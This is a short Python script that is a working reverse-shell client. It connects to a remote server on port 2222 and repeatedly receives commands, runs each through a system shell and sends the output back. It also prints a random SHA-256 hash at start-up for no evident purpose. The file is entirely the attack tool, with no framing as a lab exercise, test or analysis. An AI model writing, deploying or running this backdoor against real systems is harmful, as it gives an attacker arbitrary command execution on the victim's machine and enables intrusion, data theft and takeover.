import socket
import subprocess
import os
import hashlib
import random

# Server connect settings
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 2222
# Hash generation function
def generate_random_hash():
    random_data = os.urandom(random.randint(10, 100))  
    return hashlib.sha256(random_data).hexdigest()

def main():
    random_hash = generate_random_hash()
    print(f"Generated random hash: {random_hash}")
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect to server
    try:
        client_socket.connect((SERVER_HOST, SERVER_PORT))
        print(f"Connected to {SERVER_HOST}:{SERVER_PORT}")
    except socket.error as e:
        print(f"Error connecting to server: {e}")
        exit()
    
    while True:
        # Server command receive
        command = client_socket.recv(1024).decode().strip()
        print(f"Command received: {command}")  # Command output for clarify
        # Exiting the loop if the command is 'exit'
        if command.lower() == "exit":
            break        
        # Command execution
        if len(command) > 0:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value, stderr_value = proc.communicate()
            
            if not stdout_value:
                stdout_value = "Command executed successfully.\n".encode()            
            # Sending the execution result back to the server
            client_socket.send(stdout_value + stderr_value)
   
    client_socket.close()

if __name__ == "__main__":
    main()
